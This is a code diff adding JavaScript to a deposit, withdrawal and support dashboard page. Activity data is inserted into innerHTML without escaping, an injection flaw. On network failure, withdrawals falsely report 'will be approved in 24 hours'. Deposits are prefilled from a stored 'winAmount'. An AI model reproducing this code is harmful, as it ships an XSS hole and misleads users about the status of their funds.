+    async function loadDashboard() {
+      try {
+        const response = await fetch('/api/dashboard', {
+          headers: { 'Authorization': 'Bearer YOUR_TOKEN' }
+        });
+        const data = await response.json();
+        if (response.ok) {
+          document.getElementById('summaryBalance').textContent = `$${data.balance}`;
+          document.getElementById('summaryPending').textContent = data.pendingDeposits;
+          document.getElementById('summaryWithdraws').textContent = data.withdrawRequests;
+          const tbody = document.querySelector('#activityList tbody');
+          tbody.innerHTML = data.activities.map(a => `
+            <tr>
+              <td>${new Date(a.date).toLocaleDateString()}</td>
+              <td>${a.type}</td>
+              <td>$${a.amount}</td>
+              <td><span class="pill">${a.status}</span></td>
+            </tr>
+          `).join('');
+        }
+      } catch (error) {
+        document.getElementById('activityList').innerHTML = '<tr><td colspan="4">Error loading data.</td></tr>';
+      }
+    }
+
+    // Deposit
+    const bankBtn = document.getElementById('bankBtn');
+    const cryptoBtn = document.getElementById('cryptoBtn');
+    const bankDetails = document.getElementById('bankDetails');
+    const cryptoDetails = document.getElementById('cryptoDetails');
+    const depositProceed = document.getElementById('depositProceed');
+    const depositClear = document.getElementById('depositClear');
+    const depositMsg = document.getElementById('depositMsg');
+
+    bankBtn.addEventListener('click', () => {
+      bankDetails.classList.remove('hidden');
+      cryptoDetails.classList.add('hidden');
+      bankBtn.classList.remove('ghost');
+      cryptoBtn.classList.add('ghost');
+    });
+
+    cryptoBtn.addEventListener('click', () => {
+      cryptoDetails.classList.remove('hidden');
+      bankDetails.classList.add('hidden');
+      cryptoBtn.classList.remove('ghost');
+      bankBtn.classList.add('ghost');
+    });
+
+    depositProceed.addEventListener('click', () => {
+      const winAmount = sessionStorage.getItem('winAmount');
+      if (winAmount) {
+        document.getElementById('depositAmount').value = winAmount;
+        sessionStorage.removeItem('winAmount'); // Clear after use
+      }
+      const amount = parseFloat(document.getElementById('depositAmount').value);
+      const isBank = !bankDetails.classList.contains('hidden');
+      const details = isBank
+        ? {
+            accountNumber: document.getElementById('bankAcct').value,
+            accountHolder: document.getElementById('bankHolder').value,
+            bankName: document.getElementById('bankName').value
+          }
+        : {
+            walletAddress: document.getElementById('cryptoAddr').value,
+            cryptoName: document.getElementById('cryptoName').value
+          };
+      if (!amount || amount < 10) {
+        depositMsg.textContent = 'Please enter an amount of at least $10.';
+        return;
+      }
+      if (isBank && (!details.accountNumber || !details.accountHolder || !details.bankName)) {
+        depositMsg.textContent = 'Please provide all bank details.';
+        return;
+      }
+      if (!isBank && (!details.walletAddress || !details.cryptoName)) {
+        depositMsg.textContent = 'Please provide a wallet address and crypto name.';
+        return;
+      }
+      sessionStorage.setItem('depositDetails', JSON.stringify({ amount, isBank, ...details }));
+      window.location.href = 'deposit-details.html';
+    });
+
+    depositClear.addEventListener('click', () => {
+      document.getElementById('depositAmount').value = '';
+      document.getElementById('bankAcct').value = '';
+      document.getElementById('bankHolder').value = '';
+      document.getElementById('bankName').value = '';
+      document.getElementById('cryptoAddr').value = '';
+      document.getElementById('cryptoName').value = 'BTC';
+      depositMsg.textContent = '';
+    });
+
+    // Withdraw
+    const withdrawSubmit = document.getElementById('withdrawSubmit');
+    const withdrawClear = document.getElementById('withdrawClear');
+    const withdrawMsg = document.getElementById('withdrawMsg');
+
+    withdrawSubmit.addEventListener('click', async () => {
+      const amount = parseFloat(document.getElementById('withdrawAmount').value);
+      const destination = document.getElementById('withdrawDest').value;
+      if (!amount || amount < 1) {
+        withdrawMsg.textContent = 'Please enter an amount of at least $1.';
+        return;
+      }
+      if (!destination) {
+        withdrawMsg.textContent = 'Please provide a destination.';
+        return;
+      }
+      try {
+        const response = await fetch('/api/withdraw', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer YOUR_TOKEN' },
+          body: JSON.stringify({ amount, destination })
+        });
+        const result = await response.json();
+        withdrawMsg.textContent = response.ok ? 'Withdrawal will be approved in 24 hours.' : result.error || 'Error processing withdrawal.';
+      } catch (error) {
+        withdrawMsg.textContent = 'Withdrawal will be approved in 24 hours.'; // Fallback for demo
+      }
+    });
+
+    withdrawClear.addEventListener('click', () => {
+      document.getElementById('withdrawAmount').value = '';
+      document.getElementById('withdrawDest').value = '';
+      withdrawMsg.textContent = '';
+    });
+
+    // Support
+    const supportSubmit = document.getElementById('supportSubmit');
+    const supportClear = document.getElementById('supportClear');
+    const supportNote = document.getElementById('supportNote');
+
+    supportSubmit.addEventListener('click', async () => {
+      const subject = document.getElementById('supportSubject').value;
+      const message = document.getElementById('supportMsg').value;
+      if (!subject || !message) {
+        supportNote.textContent = 'Please provide a subject and message.';
+        return;
+      }
+      try {
+        const response = await fetch('/api/support', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer YOUR_TOKEN' },
+          body: JSON.stringify({ subject, message })
+        });
+        const result = await response.json();
+        supportNote.textContent = response.ok ? 'Support ticket submitted!' : result.error || 'Error submitting ticket.';
+      } catch (error) {
+        supportNote.textContent = 'Network error. Please try again.';
+      }
+    });
+
+    supportClear.addEventListener('click', () => {
+      document.getElementById('supportSubject').value = '';
+      document.getElementById('supportMsg').value = '';
+      supportNote.textContent = '';
+    });
+
+    // Load dashboard on page load if on dashboard section
+    if (window.location.hash === '#dashboard') {
+      showSection('dashboard');
+      loadDashboard();
+    }
   </script>
 </body>
 </html>
